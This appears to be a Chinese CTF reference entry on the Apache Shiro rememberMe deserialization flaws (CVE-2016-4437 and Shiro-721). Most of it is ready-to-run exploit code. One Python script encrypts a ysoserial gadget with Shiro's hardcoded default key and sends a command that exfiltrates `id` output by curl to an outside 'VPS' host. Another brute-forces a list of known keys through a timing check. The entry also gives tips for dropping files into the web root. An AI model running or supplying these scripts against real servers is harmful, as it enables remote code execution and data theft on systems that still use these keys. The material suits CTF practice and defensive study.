---
title: Shiro-550 / Shiro-721（rememberMe 反序列化）
category: web
tags: [shiro, rememberme, 反序列化, aeS 加密, cve-2016-4437]
signals: [rememberMe cookie, 响应里有 deleteMe, cookie 值很长以 base64 结尾, Apache Shiro, 登录页带 remember me, Cookie rememberMe, 500 错误, cve-2016-4437]
difficulty: medium
source: "NVD / 公开 PoC / 公开 writeup"
tools: [shiro_exploit, ysoserial, python, burpsuite]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 响应 `Set-Cookie: rememberMe=deleteMe;` —— 这是 Shiro 的典型指纹。
- 登录页有 "Remember Me" 勾选框。
- 提交任意 `rememberMe` cookie 后服务端返回 500 或在日志里出现 `PaddingException` / `rememberMe`。
- 题目提示 shiro、rememberMe、CVE-2016-4437。
- 变体：cookie 值以 `+` 结尾、长度固定 —— 是 AES-CBC 加密的序列化数据。

## 二、原理

**Shiro-550（CVE-2016-4437）**：Shiro ≤1.2.4 的 `rememberMe` 使用**硬编码默认密钥** `kPH+bIxk5D2deZiIxcaaaA==` 做 AES-CBC 加密。攻击者用该 key 加密 `ysoserial` gadget 的序列化数据，服务端解密后 `readObject` → RCE。

**Shiro-721**：不用默认 key，而是**Padding Oracle**：利用 CBC 的填充错误回显，逐块构造合法密文，最终把已知明文块拼到 gadget 前。需要知道一个合法的 rememberMe 密文，并且有 ±2ms 级别的时间侧信道。

流程（550）：

```
gadget(ysoserial) --AES(key, IV)--> ciphertext --base64--> Cookie: rememberMe=<b64>
```

## 三、解题步骤

1. 探测：`curl -i http://TARGET/` 看是否 `rememberMe=deleteMe`。
2. 用工具爆破 key（Shiro 默认 key 有 100+ 个，工具内置字典）。
3. 生成 ysoserial gadget（`CommonsBeanutils1` 最通用）。
4. AES-CBC 加密后用 base64 放进 cookie。
5. 触发命令执行（回连 / 写文件）。

## 四、可直接运行的脚本

Python 完整实现（AES 加密 + gadget 拼接）：

```python
import base64, uuid, subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

KEY = b"kPH+bIxk5D2deZiIxcaaaA=="            # Shiro 默认 key（base64）
# 也可用其他已知 key，如 b"2AvVhdsgUs0FSA3SDFAdag=="

def shiro_encrypt(plaintext: bytes, key_b64: bytes) -> str:
    """Shiro 的 rememberMe 加密：AES/CBC/NoPadding，key 为 base64 解码"""
    key = base64.b64decode(key_b64)
    iv = uuid.uuid4().bytes                  # 随机 16 字节 IV，前 16 字节明文与它异或
    data = pad(plaintext, 16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(data)
    return base64.b64encode(iv + ct).decode()

def gen_gadget(gadget="CommonsBeanutils1", cmd="curl http://VPS:8000/$(id|base64)",
               jar="ysoserial-all.jar"):
    return subprocess.check_output(["java", "-jar", jar, gadget, cmd])

cookie = shiro_encrypt(gen_gadget(), KEY)
print(cookie)

# 发送
import requests
r = requests.get("http://TARGET/", cookies={"rememberMe": cookie}, timeout=10)
print(r.status_code, r.text[:200])
```

> 注意：Shiro 的实现是 `AES/CBC`，但加密时**把 IV 放在密文最前面**；上面的写法与 shiro 的 `CipherService` 默认行为等价（`rememberMe` 解密时需要 IV 前置）。

爆破 key（不用第三方工具）：

```python
import base64, requests
from Crypto.Cipher import AES

DEFAULT_KEYS = [
    b"kPH+bIxk5D2deZiIxcaaaA==",
    b"2AvVhdsgUs0FSA3SDFAdag==",
    b"3AvVhmFLUs0KTA3Kprsdag==",
    b"Z3VucwAAAAAAAAAAAAAAAA==",
    b"fCq+/sbmRHCbtaO0Z9W+KA==",
    b"6ZmI6I2j5Y+R5aSn5ZOlAA==",
    b"r0e3c16f484c6a798f1d490b8f2f6b8f",   # 也有十六进制 key
]

def try_key(url, key_b64, cmd="sleep 5"):
    """用不同 key 加密同一 gadget，看响应差异（500 vs 正常）"""
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    import uuid, subprocess, time
    key = base64.b64decode(key_b64) if len(base64.b64decode(key_b64)) in (16, 24, 32) else None
    if not key: return False
    gadget = subprocess.check_output(
        ["java", "-jar", "ysoserial-all.jar", "CommonsBeanutils1", cmd])
    iv = uuid.uuid4().bytes
    ct = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(gadget, 16))
    cookie = base64.b64encode(iv + ct).decode()
    t = time.time()
    r = requests.get(url, cookies={"rememberMe": cookie}, timeout=20)
    dt = time.time() - t
    return dt > 4          # sleep 生效则命中

for k in DEFAULT_KEYS:
    try:
        if try_key("http://TARGET/", k):
            print("KEY FOUND:", k); break
    except Exception as e:
        print("err", k, e)
```

现成工具（推荐，省时间）：

```bash
# shiro_exploit：一键探测 + 爆破 + 利用
python3 shiro_exploit.py -u http://TARGET/ -t 3
# 或用 shiro_attack-4.5.3（GUI，国内 CTF 常用）
```

## 五、常见坑 / 变体

- **`rememberMe=deleteMe` 只是"可能"**：某些 WAF/框架也返回，需再验证 500。
- **key 的格式**：Shiro 默认 key 是 base64 的 16 字节；有些题改成 hex 字符串，工具里要切模式。
- **Gadget 依赖**：目标 classpath 不一定有 commons-collections，`CommonsBeanutils1` 更通用；都失败时试 `Jdk8u20`、`Groovy1`。
- **加密模式细节**：Shiro 1.x 默认 `AES/CBC/PKCS5Padding`，但部分版本用 `NoPadding` 且手动 pad，工具会自动处理。
- **回连失败**：用 `sleep 5` / `curl` 出网验证；不出网时写文件到 Web 目录（`/tmp/...` 或 `${catalina.base}/webapps/ROOT/`）。
- 变体：**Shiro-721**（CVE-2019-12422）Padding Oracle，需要合法 rememberMe 值 + 时间侧信道，工具 `shiro_attack` 支持。
- 变体：**Shiro 的 `rememberMeManager` 自定义 key** → 只能用 721 或放弃。

## 六、参考来源

- [NVD - CVE-2016-4437（Shiro-550）](https://nvd.nist.gov/vuln/detail/CVE-2016-4437)
- [NVD - CVE-2019-12422（Shiro-721）](https://nvd.nist.gov/vuln/detail/CVE-2019-12422)
- [Shiro 官方安全公告](https://shiro.apache.org/security-reports.html)
- [shiro_exploit（3ndz）](https://github.com/SummerSec/ShiroAttack2)
- [ysoserial](https://github.com/frohoff/ysoserial)
